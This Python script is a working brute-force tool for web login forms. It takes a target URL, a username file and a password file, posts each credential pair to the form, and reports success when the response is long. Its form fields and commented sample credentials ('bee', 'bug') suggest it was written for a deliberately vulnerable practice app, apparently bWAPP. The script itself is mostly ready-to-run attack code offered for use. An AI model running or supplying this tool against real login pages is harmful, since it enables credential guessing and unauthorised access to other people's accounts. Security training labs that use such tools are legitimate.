#!/usr/bin/env python3

# importing the sys module so that we can
# use command line arguments for targetURL
import sys

# importing requests library to contact targetURL
import requests

# Banner
print("""
--------------------------------
    Web App Brute Force Tool    
--------------------------------""") #Removed newline for better formatting

if len(sys.argv) > 1 :
	match sys.argv[1]:
		case '-u':
			targetURL = sys.argv[2]
		case '-l':
			loginNamesFile = sys.argv[2]
		case '-w':
			passwordsFile = sys.argv[2]
		case _:
			print('')
			print('-----------------------------------------------')
			print(f'[!] Invalid Option {sys.argv[1]} {sys.argv[2]}')
			print('-----------------------------------------------')
			print('')
			#exit() # Added to avoid undeclared 'NameError' errors
	match sys.argv[3]:
		case '-u':
			targetURL = sys.argv[4]
		case '-l':
			loginNamesFile = sys.argv[4]
		case '-w':
			passwordsFile = sys.argv[4]
		case _:
			print('')
			print('-----------------------------------------------')
			print(f'[!] Invalid Option {sys.argv[3]} {sys.argv[4]}')
			print('-----------------------------------------------')
			print('')
			#exit() # Added to avoid undeclared 'NameError' errors
	match sys.argv[5]:
		case '-u':
			targetURL = sys.argv[6]
		case '-l':
			loginNamesFile = sys.argv[6]
		case '-w':
			passwordsFile = sys.argv[6]
		case _:
			print('')
			print('-----------------------------------------------')
			print(f'[!] Invalid Option {sys.argv[5]} {sys.argv[6]}')
			print('-----------------------------------------------')
			print('')
			exit() # Added to avoid undeclared 'NameError' errors
else:
	targetURL = input("[>] Enter Target URL: ")
	loginNamesFile = input("[>] Enter Login Names File: ")
	passwordsFile = input("[>] Enter Password File: ")

print(f"""
---------------------------------------
[*] Target URL: {targetURL}
[*] Login File: {loginNamesFile}
[*] Pass File: {passwordsFile}
---------------------------------------
""")

# Opening loginNamesFile and passwordsFile
with open(loginNamesFile, encoding="utf-8") as LNF:
	loginNames = LNF.readlines()
with open(passwordsFile, encoding="utf-8") as PWF:
	passwords = PWF.readlines()

try:
	# Login names and common passwords
	#loginNames = ["root", "admin", "guest", "test", "user1", "bee"]
	#passwords = ["password", "qwerty", "123456", "12345678", "123456789", "bug"]
	for name in loginNames:
		n = name.strip()
		print(f'[*] Trying Login for User: {n}')
		for word in passwords:
			w = word.strip()
			# POST Data = login=admin&password=123456789&security_level=0&form=submit
			r = requests.post(targetURL, data={'login': n, 'password': w, 'security_level': '0', 'form': 'submit'})
			#print(f"[*] Trying Creds ~> {n}:{w}")
			if len(r.text) > 4086:
				print(f"[!] SUCCESS!!! \033[31m{n}:{w}\033[0m")
				break

except:
	print("[!] Issue with Target URL")
	print("[!] Usage: ./brute-force.py https://target-url")
	print("[!] CHECK YOUR URL!")






